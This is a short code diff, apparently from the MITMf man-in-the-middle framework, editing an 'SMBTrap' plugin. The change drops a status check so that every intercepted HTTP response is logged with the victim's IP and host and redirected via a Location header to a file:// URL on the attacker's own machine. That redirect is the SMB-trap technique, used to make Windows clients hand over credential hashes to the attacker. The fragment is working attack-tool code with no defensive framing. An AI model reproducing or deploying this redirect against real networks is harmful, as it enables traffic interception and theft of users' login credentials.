@@ -26,6 +26,5 @@ class SMBTrap(Plugin):
 		return {"request": request, "version": version, "code": 302, "message": "Found"}
 
 	def serverHeaders(self, response, request):
-		if self.getStatus():
-			mitmf_logger.info("{} [SMBTrap] Trapping request to {}".format(request.client.getClientIP(), request.headers['host']))
-			response.headers["Location"] = "file://{}/{}".format(self.ourip, ''.join(random.sample(string.ascii_uppercase + string.digits, 8)))
+		mitmf_logger.info("{} [SMBTrap] Trapping request to {}".format(request.client.getClientIP(), request.headers['host']))
+		response.headers["Location"] = "file://{}/{}".format(self.ourip, ''.join(random.sample(string.ascii_uppercase + string.digits, 8)))
